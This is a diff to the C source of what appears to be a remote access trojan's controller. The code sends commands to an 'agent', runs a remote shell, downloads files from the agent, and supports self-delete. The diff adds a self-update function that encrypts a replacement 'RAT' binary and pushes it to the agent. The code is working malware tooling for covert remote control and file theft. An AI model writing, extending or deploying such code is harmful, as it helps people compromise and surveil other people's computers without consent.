@@ -54,10 +54,11 @@ void PrintHelp(void){
         "\tdownload [filename_on_agent] [local_dir]: securely download a file from agent.\n"
         "\tdelete [filename_path_on_agent]: delete certain file.\n"
         "\tlist drives: list all fixed and removable drives on agent.\n"
-        "\tGetDate [folder_path_on_agent]: Get date of all files in desired folder on agent.\n"
+        "\tGetDate [folder/file_path_on_agent]: Get date of all files in desired folder on agent.\n"
         "\tlist drives: list all fixed and removable drives on agent.\n"
         "\treboot: reboot the agent.\n"
         "\tself-delete: delete the agent executable.\n"
+        "\tself-update /path/to/[local_updated_RAT]: delete the agent exe and replace it with the updated version"
         "\texit: exit connection.\n"
         );
     return;
@@ -141,8 +142,8 @@ void HandleShell(char *cmd,int client_socket) {
     int sock_flags = fcntl(client_socket, F_GETFL, 0);
 
     // Set stdin to non-blocking so we can check for user input
-    int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
-    fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
+    //int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
+    fcntl(STDIN_FILENO, F_SETFL, stdin_flags | O_NONBLOCK);
     
     // Set socket to non-blocking for the select() call
     fcntl(client_socket, F_SETFL, O_NONBLOCK);
@@ -215,7 +216,7 @@ void HandleShell(char *cmd,int client_socket) {
     }
     
     // Restore original flags
-    fcntl(STDIN_FILENO, F_SETFL, flags);
+    fcntl(STDIN_FILENO, F_SETFL, stdin_flags);
     fcntl(client_socket, F_SETFL, sock_flags);
     tcflush(STDIN_FILENO, TCIFLUSH);
     clearerr(stdin);
@@ -476,8 +477,23 @@ int DownloadFile(char *cmd,int client_socket, char * filename, char * SavePath) 
     
     // Construct full save path
     char full_path[BUFFER_SIZE];
-    char *bnFileName = basename(filename);
-    snprintf(full_path, sizeof(full_path), "%s/%s", SavePath, bnFileName);
+
+    // Find the last forward slash
+    const char* last_slash = strrchr(filename, '\\');
+    char* FileBaseName = malloc(BUFFER_SIZE);
+    if (last_slash != NULL) {
+        // The filename starts after the slash
+        strcpy(FileBaseName, last_slash + 1);
+        printf("Filename: %s\n", FileBaseName);
+    }
+    else {
+        // No slash found, entire string is the filename
+        strcpy(FileBaseName, filename);
+        printf("Filename: %s\n", FileBaseName);
+    }
+
+
+    snprintf(full_path, sizeof(full_path), "%s/%s", SavePath, FileBaseName);
     
     // Open file for writing
     printf("full_path: %s\n",full_path);
@@ -593,6 +609,7 @@ int DownloadFile(char *cmd,int client_socket, char * filename, char * SavePath) 
     printf("[+] File received successfully! Total bytes written: %d\n", bytes_written);
     printf("[+] File saved to: %s\n", full_path);
     
+    free(FileBaseName);
     return 0;
 }
 
@@ -697,6 +714,133 @@ void HandleSelfDelete(char *cmd, int client_socket){
     char recv_buf[BUFFER_SIZE] = {0};
 
     printf("[+] self-destruct success!\n");
+    return;
+}
+
+void HandleSelfUpdate(char *cmd, int client_socket, char * FilePath){
+    ssize_t sent_bytes = 0;
+    ssize_t bytes_received = 0;
+    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
+    sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
+    if (sent_bytes == -1){
+        perror("[x] send() failed");
+        return;
+    }
+    char recv_buf[BUFFER_SIZE] = {0};
+
+    printf("[+] self-destruct success!\n");
+    
+    
+    // Check if file exists
+    //FILE* file = fopen(filename, "rb");
+    int file = open(FilePath,O_RDONLY);
+    if (file == -1) {
+        perror("Failed to open file");
+        return ;
+    }
+
+
+    // Get file stats 
+    struct stat file_stat;
+    if (fstat(file, &file_stat) < 0)
+    {
+            fprintf(stderr, "Error fstat --> %s", strerror(errno));
+
+            exit(EXIT_FAILURE);
+    }
+
+    fprintf(stdout, "File Size: %ld bytes\n", file_stat.st_size);
+
+    
+
+
+    // send file size
+    char file_size[BUFFER_SIZE];
+    sprintf(file_size, "%ld", file_stat.st_size);
+
+    encrypt( (unsigned char *)file_size,(size_t) strlen(file_size));
+    printf("[+] Encrypt success\n");
+    sent_bytes = send(client_socket,file_size,(size_t) sizeof(file_size),0);
+    if (sent_bytes == -1){
+        printf("[x] send() failed\n");
+        return ;
+    }
+    printf("[+] send() file size success\n");
+    
+
+
+
+    // Create temporary file for encrypted data
+    char tmp_filename[] = "/tmp/encrypted_XXXXXX";
+    int tmp_fd = mkstemp(tmp_filename);
+    if (tmp_fd == -1) {
+        perror("[x] Failed to create temp file");
+        close(file);
+        return ;
+    }
+    printf("[+] created tmp file\n");
+
+    // Read, encrypt, write to temp file
+    unsigned char buffer[BUFFER_SIZE];
+    ssize_t bytes_read;
+    
+    while ((bytes_read = read(file, buffer, BUFFER_SIZE)) > 0) {
+        // Encrypt buffer
+        encrypt((unsigned char *)buffer, (size_t) bytes_read);
+        
+        // Write to temp file
+        if (write(tmp_fd, buffer, bytes_read) != bytes_read) {
+            perror("[x] Failed to write to temp file");
+            close(file);
+            close(tmp_fd);
+            unlink(tmp_filename);
+            return ;
+        }
+    }
+    printf("[+] Encrypted tmp file success\n");
+
+    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE, 0);
+    if (bytes_received < 0) {
+        perror("[x] recv() failed");
+        close(file);
+        close(tmp_fd);
+        unlink(tmp_filename);
+        return ;
+    }
+    
+    decrypt( (unsigned char *)recv_buf,(size_t) strlen(recv_buf));
+    int err_no = 16000;
+    err_no = atoi(recv_buf);
+    printf("err_no is %d\n",err_no);
+    if (err_no != 16000){
+        printf("[x] File couldn't be sent: %s\n",strerror(err_no));
+        close(file);
+        close(tmp_fd);
+        unlink(tmp_filename);
+        return ;
+    }
+
+    //send file data
+    off_t offset = 0;
+    int remain_data = file_stat.st_size;
+
+    
+    
+    while (((sent_bytes = sendfile(client_socket, tmp_fd, &offset, BUFFER_SIZE)) > 0) && (remain_data > 0))
+        {
+                fprintf(stdout, "Server sent %ld bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data);
+                remain_data -= sent_bytes;
+
+        }
+
+    
+    
+    //printf("\n[+] File sent successfully!\n");
+
+    close(file);
+    close(tmp_fd);
+    unlink(tmp_filename);
+
     return;
 }
 
